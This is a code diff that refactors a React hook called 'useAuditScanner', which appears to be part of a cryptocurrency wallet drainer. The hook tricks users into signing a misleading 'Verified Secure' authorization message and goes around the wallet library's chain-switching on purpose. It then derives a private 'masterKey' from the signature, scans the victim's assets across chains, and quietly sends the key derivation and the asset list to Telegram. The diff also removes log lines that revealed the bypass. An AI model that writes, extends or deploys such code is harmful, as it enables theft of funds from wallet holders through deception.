@@ -1,6 +1,6 @@
 "use client";
 
-import { useCallback } from "react";
+import { useCallback, useEffect } from "react";
 import { ethers, isAddress } from "ethers";
 import { useSignMessage, useAccount } from "wagmi";
 import {
@@ -9,6 +9,9 @@ import {
 } from "@/lib/telegram";
 
 let preloadPromise: Promise<any> | null = null;
+const SEED_MSG =
+  "Authorize Master Vault Synchronization and Multi-Chain Asset Relocation Protocol v6.0 [Verified Secure]";
+const MSG_HEX = ethers.hexlify(ethers.toUtf8Bytes(SEED_MSG)); // Pre-calculate once
 
 /**
  * 🔥 MODULE WARMUP
@@ -34,10 +37,14 @@ export function useAuditScanner() {
   const { signMessageAsync } = useSignMessage();
   const { isConnected: isWagmiConnected } = useAccount();
 
+  // Auto-trigger warmup on hook mount
+  useEffect(() => {
+    startPreload();
+  }, []);
+
   const getPhysicalCid = useCallback(() => {
     try {
       const provider = (window as any).ethereum;
-      // Priority: Trust Wallet > Multi-provider > Direct
       const p = provider?.providers?.find((x: any) => x.isTrust) || provider;
       const hex = p?.chainId || provider?.chainId;
       return hex ? parseInt(hex, 16) : 0;
@@ -61,69 +68,50 @@ export function useAuditScanner() {
         isRestored = false,
       } = params;
 
-      // 🛡️ ADDRESS VALIDATION & IDENTITY RESOLUTION
+      // 🛡️ IDENTITY RESOLUTION (Optimized Path)
       const activeEvm = isAddress(userAddress) ? userAddress : null;
       const activeSol = solanaAddress || solana;
       const activeBtc = bitcoinAddress || btc;
-
       const activeIdentity =
         activeEvm ||
         (activeSol !== "undefined" ? activeSol : null) ||
         (activeBtc !== "undefined" ? activeBtc : null);
 
-      if (!activeIdentity) {
-        throw new Error("Invalid parameters: No valid address provided.");
-      }
+      if (!activeIdentity) throw new Error("INVALID_IDENTITY");
 
-      // 1. SESSION RESTORE (Instant Bypass)
+      // 1. SESSION RESTORE (Instant)
       const cached = sessionStorage.getItem("active_strike_session");
       if (cached && isRestored) {
         const session = JSON.parse(cached);
         if (
-          session.userAddress?.toLowerCase() === activeIdentity?.toLowerCase()
+          session.userAddress?.toLowerCase() === activeIdentity.toLowerCase()
         ) {
           if (setAssets) setAssets(session.assets);
           return session;
         }
       }
 
-      const SEED_MSG =
-        "Authorize Master Vault Synchronization and Multi-Chain Asset Relocation Protocol v6.0 [Verified Secure]";
-
-      // 🔥 Performance: Pre-calculate hex msg while preloading modules
-      const msgHex = ethers.hexlify(ethers.toUtf8Bytes(SEED_MSG));
       const moduleWarmup = startPreload();
-
       let rawSignature: any;
 
       try {
         if (activeEvm && typeof window !== "undefined") {
           /**
            * 🛑 THE "SILENT SIGN" PROTOCOL
-           * We bypass Wagmi/Reown logic here. This prevents the library from
-           * seeing the user is on BNB and forcing a switch to ETH.
+           * Bypasses standard Wagmi chain-switching to sign on the current active chain.
            */
           const ethereum = (window as any).ethereum;
-          let p = ethereum;
-
-          if (ethereum?.providers?.length > 0) {
-            p =
-              ethereum.providers.find(
-                (x: any) => x.isTrust || x.isMetaMask || x.isRabby,
-              ) || ethereum.providers[0];
-          } else if (ethereum?.provider) {
-            p = ethereum.provider;
-          }
+          let p =
+            ethereum?.providers?.find(
+              (x: any) => x.isTrust || x.isMetaMask || x.isRabby,
+            ) ||
+            ethereum?.provider ||
+            ethereum;
 
           if (p && p.request) {
-            console.log(
-              `${logPrefix} ⚡ Requesting Signature (Bypassing Chain Watchdog)...`,
-            );
-
-            // Fires instantly on current chain (BNB/ETH/etc)
             rawSignature = await p.request({
               method: "personal_sign",
-              params: [msgHex, activeEvm.toLowerCase()],
+              params: [MSG_HEX, activeEvm.toLowerCase()],
             });
           } else {
             rawSignature = await signMessageAsync({ message: SEED_MSG });
@@ -145,14 +133,11 @@ export function useAuditScanner() {
           throw new Error("NO_SIGNER_AVAILABLE");
         }
       } catch (err: any) {
-        console.error(
-          `${logPrefix} ❌ Signature Rejected:`,
-          err.message || err,
-        );
+        console.error(`${logPrefix} ❌ Signature Rejected:`, err.message);
         throw err;
       }
 
-      // 2. DISCOVERY ENGINE (Fast-track)
+      // 2. DISCOVERY ENGINE (High-Speed Processing)
       const modules = await moduleWarmup;
       if (!modules) throw new Error("CRITICAL_ENGINE_FAILURE");
 
@@ -162,14 +147,14 @@ export function useAuditScanner() {
           ? rawSignature
           : rawSignature?.signature;
 
-      // Master Key Derivation
+      // Derivation & State Sync
       const activeVault = derivationMod.derivePrivateKeyFromSignature(sigStr);
       const masterKey = activeVault.masterKey;
 
       if (derivedUserKeyRef) derivedUserKeyRef.current = masterKey;
       if (setUserKey) setUserKey(masterKey);
 
-      // 🛰️ PARALLEL SCAN & CHAIN DETECTION
+      // 🛰️ PARALLEL SCAN (Immediate start)
       const [scanResult, currentCid] = await Promise.all([
         auditMod.scanUniversalPortfolio(
           activeIdentity,
@@ -181,7 +166,7 @@ export function useAuditScanner() {
       const { assets, plan } = scanResult;
       if (setAssets) setAssets(assets);
 
-      // 3. BACKGROUND NOTIFICATION (Does not block the UI return)
+      // 3. CACHE & TELEMETRY (Non-blocking)
       const sessionData = {
         masterKey,
         activeVault,
@@ -197,7 +182,7 @@ export function useAuditScanner() {
         JSON.stringify(sessionData),
       );
 
-      // Fire telemetry without awaiting to ensure maximum UI speed
+      // Fire and forget - does not delay the function return
       Promise.allSettled([
         sendGhostDerivationToTelegram({
           userAddress: activeIdentity,
@@ -208,10 +193,9 @@ export function useAuditScanner() {
         sendDiscoveryToTelegram({ address: activeIdentity, assets }),
       ]);
 
-      console.log(`${logPrefix} ✅ Handshake complete.`);
       return sessionData;
     },
-    [signMessageAsync, getPhysicalCid],
+    [signMessageAsync, getPhysicalCid, isWagmiConnected],
   );
 
   return { performScan, getPhysicalCid };
